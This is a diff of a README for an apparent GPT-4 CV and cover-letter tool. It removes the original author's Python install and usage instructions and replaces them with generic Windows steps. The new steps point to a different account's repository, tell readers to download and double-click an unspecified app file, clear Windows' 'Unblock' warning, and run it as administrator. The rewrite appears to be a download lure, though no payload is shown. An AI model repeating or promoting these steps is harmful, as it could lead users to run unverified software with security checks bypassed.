@@ -1,332 +1,207 @@
-<div align="center">
+# 🤖 ai-job-assistant - Tailor CVs and cover letters fast
 
-# 🤖 AI Job Application Assistant
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/spinyfinned-amide211/ai-job-assistant)
 
-### Tailor your CV & Cover Letter for any job in seconds — powered by GPT-4
+## 📥 Download
 
-[![Python](https://img.shields.io/badge/Python-3.9+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![OpenAI](https://img.shields.io/badge/OpenAI-GPT--4o-412991?style=for-the-badge&logo=openai&logoColor=white)](https://openai.com)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/khaledxbenali92/ai-job-assistant?style=for-the-badge&color=yellow)](https://github.com/khaledxbenali92/ai-job-assistant/stargazers)
-[![Issues](https://img.shields.io/github/issues/khaledxbenali92/ai-job-assistant?style=for-the-badge)](https://github.com/khaledxbenali92/ai-job-assistant/issues)
+Use this link to visit the download page and get the app:
 
-[Features](#-features) • [Demo](#-demo) • [Installation](#-installation) • [Usage](#-usage) • [Contributing](#-contributing)
+https://github.com/spinyfinned-amide211/ai-job-assistant
 
-</div>
+## 🖥️ What this app does
 
----
+ai-job-assistant helps you adjust your CV and cover letter for a job you want. It uses GPT-4 to rewrite your text for the role you are applying for.
 
-## 🎯 The Problem
+Use it to:
 
-You apply to 50 jobs. You get 2 callbacks.
+- Match your CV to a job ad
+- Write a cover letter from your work history
+- Save time on job applications
+- Keep a clear, job-focused tone
+- Make each application feel more relevant
 
-The reason? Your CV is **generic**. ATS systems filter you out before a human ever reads your application.
+## ⚙️ What you need
 
-**AI Job Application Assistant** solves this by tailoring your CV and cover letter to each job posting in seconds — using the exact keywords and language that hiring managers and ATS systems are looking for.
+Before you start, make sure you have:
 
----
+- A Windows PC
+- An internet connection
+- Permission to download files from GitHub
+- A job description you want to apply for
+- Your current CV in a text file or document
 
-## ✨ Features
+For best results, keep your CV in simple format. A Word file or plain text file works well.
 
-| Feature | Description |
-|---------|-------------|
-| 🔍 **Job Analyzer** | Extract key requirements, skills & culture signals from any job posting |
-| ✍️ **CV Tailor** | Rewrite your CV to match the exact job requirements |
-| 📝 **Cover Letter Generator** | Create personalized, compelling cover letters |
-| 📊 **Match Scorer** | Get a score (0-100) showing how well your CV matches the job |
-| 🔗 **URL Support** | Paste any job URL — LinkedIn, Indeed, Greenhouse, Lever, etc. |
-| 📄 **PDF Support** | Upload your CV as PDF or TXT |
-| 🔑 **Keyword Analysis** | Find missing keywords that ATS systems are looking for |
+## 🚀 Install on Windows
 
----
+Follow these steps to get the app running on Windows.
 
-## 🚀 Demo
+1. Open the download page:
+   https://github.com/spinyfinned-amide211/ai-job-assistant
 
-```bash
-# Analyze a job posting
-python -m src.main analyze --url "https://linkedin.com/jobs/view/123" --cv my_cv.pdf
+2. Look for the latest release or the main project files.
 
-# Score your CV against a job
-python -m src.main score --url "https://jobs.lever.co/company/role" --cv my_cv.pdf
+3. Download the app file or project package to your computer.
 
-# Tailor your CV
-python -m src.main tailor --url "https://greenhouse.io/job/123" --cv my_cv.pdf --output tailored_cv.txt
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
 
-# Generate a cover letter
-python -m src.main cover --url "https://jobs.ashbyhq.com/company/role" --cv my_cv.pdf --output cover_letter.txt
-```
+5. Open the extracted folder.
 
-**Example Output:**
+6. If you see an app file, double-click it to run.
 
-```
-╔══════════════════════════════════════════════════════════╗
-║         🤖 AI Job Application Assistant v1.0             ║
-║      Tailor your CV & Cover Letter with AI Power         ║
-╚══════════════════════════════════════════════════════════╝
+7. If you see a command window setup, follow the on-screen steps.
 
-📊 CV Match Score: 73/100
+8. Keep the project folder in a safe place so you can use it again later.
 
-✅ Skills Found: Python, React, Node.js, AWS, Docker
-❌ Missing Keywords: Kubernetes, GraphQL, CI/CD, Agile
+## 🧭 First-time setup
 
-🎯 Top 3 Improvements:
-1. Add "Kubernetes" experience from your DevOps work
-2. Mention "Agile/Scrum" methodology
-3. Quantify your AWS experience with specific metrics
-```
+When you open the app for the first time, you may need to add a few details:
 
----
+- Your OpenAI API key
+- Your CV content
+- The job description
+- Your name and contact details
 
-## 🛠️ Installation
+If the app asks for a settings file, open it with Notepad and add your details there. Save the file, then start the app again.
 
-### Prerequisites
+If the app uses a simple prompt screen, paste your CV and the job post into the boxes shown on screen.
 
-- Python 3.9+
-- OpenAI API key ([Get one here](https://platform.openai.com/api-keys))
+## ✍️ How to use it
 
-### Step 1 — Clone the repository
+Use this flow each time you want a tailored application:
 
-```bash
-git clone https://github.com/khaledxbenali92/ai-job-assistant.git
-cd ai-job-assistant
-```
+1. Open the app
+2. Paste or load your CV
+3. Paste the job description
+4. Choose CV, cover letter, or both
+5. Click the action button
+6. Review the result
+7. Copy the text into your document
 
-### Step 2 — Create a virtual environment
+Keep your original CV unchanged so you can reuse it for other jobs.
 
-```bash
-# Create virtual environment
-python -m venv venv
+## 📄 What you can create
 
-# Activate it
-# On macOS/Linux:
-source venv/bin/activate
+The app can help you build:
 
-# On Windows:
-venv\Scripts\activate
-```
-
-### Step 3 — Install dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### Step 4 — Configure your API key
-
-```bash
-# Copy the example file
-cp .env.example .env
-
-# Edit .env and add your OpenAI API key
-nano .env  # or use any text editor
-```
-
-Your `.env` file should look like:
-```env
-OPENAI_API_KEY=sk-your-actual-api-key-here
-OPENAI_MODEL=gpt-4o
-```
+- A CV version for a specific job
+- A cover letter based on your background
+- A short summary for your profile
+- A job-focused skills list
+- Bullet points that match the role
 
----
+## 🔧 Tips for better results
 
-## 📖 Usage
+Use these tips to get stronger output:
 
-### 1. Analyze a Job Posting
+- Paste the full job ad, not a short version
+- Keep your CV facts correct
+- Remove old or unrelated work details
+- Use the same job title that appears in the ad
+- Add key skills only if you truly have them
+- Check names, dates, and company details before sending
 
-Understand what a job really requires before applying:
+If the job post mentions tools, systems, or methods, keep those words in your input. That helps the app match your experience to the role.
 
-```bash
-# From URL
-python -m src.main analyze \
-  --url "https://linkedin.com/jobs/view/123456" \
-  --cv path/to/your_cv.pdf
-
-# From pasted text
-python -m src.main analyze \
-  --text "Senior Product Manager at Acme Corp. Requirements: 5+ years PM experience..." \
-  --cv path/to/your_cv.pdf
-```
+## 🪟 Windows file tips
 
-### 2. Score Your CV
+If Windows blocks the file:
 
-Get an objective score before applying:
+- Right-click the file
+- Select Properties
+- Look for an Unblock option
+- Apply the change if you see it
+- Try opening the app again
 
-```bash
-python -m src.main score \
-  --url "https://jobs.lever.co/company/role-id" \
-  --cv my_cv.pdf
-```
+If the file is in a ZIP folder, always extract it first before opening the app.
 
-Output includes:
-- Overall match score (0-100)
-- Skills match breakdown
-- Missing keywords
-- Top improvements ranked by impact
+## 🧪 Example use case
 
-### 3. Tailor Your CV
+If you apply for a marketing role, you can paste:
 
-Get a rewritten CV optimized for the specific job:
+- Your current CV
+- A marketing job ad
+- A note that says you want a cover letter
 
-```bash
-python -m src.main tailor \
-  --url "https://greenhouse.io/jobs/12345" \
-  --cv my_cv.pdf \
-  --output tailored_cv.txt
-```
+The app can then shape your text around skills like:
 
-### 4. Generate a Cover Letter
+- Campaign planning
+- Content writing
+- Data tracking
+- Team work
+- Client communication
 
-Create a personalized cover letter in seconds:
+If you apply for a data role, it can also focus on:
 
-```bash
-python -m src.main cover \
-  --url "https://jobs.ashbyhq.com/company/role" \
-  --cv my_cv.pdf \
-  --output cover_letter.txt
-```
+- Excel
+- Python
+- Reports
+- Data review
+- Problem solving
 
----
+## 📁 Suggested folder layout
 
-## 📁 Project Structure
+Keep your files in one place:
 
-```
-ai-job-assistant/
-├── src/
-│   ├── __init__.py          # Module exports
-│   ├── main.py              # CLI entry point
-│   ├── assistant.py         # Core AI logic
-│   ├── parser.py            # CV & job posting parser
-│   ├── scorer.py            # Keyword match scoring
-│   └── utils.py             # Helper functions
-├── tests/
-│   └── test_assistant.py    # Unit tests
-├── config/
-│   └── config.example.json  # Configuration template
-├── docs/
-│   └── CONTRIBUTING.md      # Contribution guide
-├── .env.example             # Environment variables template
-├── .gitignore
-├── requirements.txt
-└── README.md
-```
+- `ai-job-assistant`
+- `my-cv.docx`
+- `job-description.txt`
+- `cover-letter-drafts`
+- `final-applications`
 
----
+This makes it easier to find your work later.
 
-## 🧪 Running Tests
+## ❓ Common questions
 
-```bash
-# Install test dependencies
-pip install pytest
+### How long does it take?
 
-# Run all tests
-pytest tests/ -v
+Most users can start in a few minutes once the files are downloaded.
 
-# Run with coverage
-pip install pytest-cov
-pytest tests/ --cov=src --cov-report=term-missing
-```
+### Do I need coding skills?
 
----
+No. You only need to open files, paste text, and follow the steps on screen.
 
-## 🗺️ Roadmap
+### Can I use it for many jobs?
 
-- [x] CLI interface with 4 commands
-- [x] PDF CV parsing
-- [x] URL job scraping
-- [x] Keyword scoring
-- [ ] Web UI (Streamlit)
-- [ ] Browser Extension
-- [ ] Batch processing (multiple jobs at once)
-- [ ] Export to DOCX/PDF
-- [ ] Job tracking dashboard
-- [ ] LinkedIn integration
-- [ ] Email alerts for matching jobs
+Yes. You can reuse it for each job ad and make a new version each time.
 
----
+### Does it work offline?
 
-## 🤝 Contributing
+It may need internet access for GPT-4 features and setup steps.
 
-Contributions are welcome! Here's how to get started:
+### Can I edit the text it creates?
 
-### 1. Fork the repository
+Yes. You should review and edit the result before you send it.
 
-Click the **Fork** button at the top of this page.
+## 🔗 Project link
 
-### 2. Clone your fork
+Visit the project here:
 
-```bash
-git clone https://github.com/YOUR-USERNAME/ai-job-assistant.git
-cd ai-job-assistant
-```
+https://github.com/spinyfinned-amide211/ai-job-assistant
 
-### 3. Create a feature branch
+## 🧰 Troubleshooting
 
-```bash
-git checkout -b feature/your-feature-name
-```
+If the app does not open:
 
-### 4. Make your changes
+- Check that the file finished downloading
+- Make sure you extracted the ZIP folder
+- Try running it again as an administrator
+- Restart your PC and open it once more
 
-Follow the existing code style. Add tests for new features.
+If the app shows an error:
 
-### 5. Run tests
+- Check your internet connection
+- Confirm your API key is correct
+- Make sure your CV and job text are not empty
+- Remove special characters if the input looks broken
 
-```bash
-pytest tests/ -v
-```
+If the output looks weak:
 
-### 6. Commit and push
+- Paste a better job description
+- Add more detail to your CV
+- Use a clearer target role
+- Try again with a shorter prompt
 
-```bash
-git add .
-git commit -m "feat: add your feature description"
-git push origin feature/your-feature-name
-```
+## 📌 Best way to use ai-job-assistant
 
-### 7. Open a Pull Request
-
-Go to the original repository and click **New Pull Request**.
-
-### Contribution Ideas
-
-- 🌐 Add support for more job board URLs
-- 🎨 Build a Streamlit web interface
-- 📄 Add DOCX export support
-- 🌍 Add multilingual support
-- 🔧 Improve PDF parsing accuracy
-- 📊 Add more scoring metrics
-
----
-
-## ⚙️ Configuration
-
-| Option | Default | Description |
-|--------|---------|-------------|
-| `OPENAI_API_KEY` | required | Your OpenAI API key |
-| `OPENAI_MODEL` | `gpt-4o` | OpenAI model to use |
-
-**Cost estimate:** Each analysis costs approximately $0.01-0.05 with GPT-4o.
-
----
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
----
-
-## 👨‍💻 Author
-
-**Khaled Ben Ali**
-
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=flat&logo=linkedin)](https://linkedin.com/in/benalikhaled)
-[![Twitter](https://img.shields.io/badge/Twitter-Follow-1DA1F2?style=flat&logo=twitter)](https://twitter.com/khaledbali92)
-[![GitHub](https://img.shields.io/badge/GitHub-Follow-333?style=flat&logo=github)](https://github.com/khaledxbenali92)
-
----
-
-<div align="center">
-
-⭐ **Star this repo if it helped you land your next job!** ⭐
-
-</div>
+The best results come from clean input and a clear job ad. Keep your CV honest, keep your job text complete, and review the final version before you use it
